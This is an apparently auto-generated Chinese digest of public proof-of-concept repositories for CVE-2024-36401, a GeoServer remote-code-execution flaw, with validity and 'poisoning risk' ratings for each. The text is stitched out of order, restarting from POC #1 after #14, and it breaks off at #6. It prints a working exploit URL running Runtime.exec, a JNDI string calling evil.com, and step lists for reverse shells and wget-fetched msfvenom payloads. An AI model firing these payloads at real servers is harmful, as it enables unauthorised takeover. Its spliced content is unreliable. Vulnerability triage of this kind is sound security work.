3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

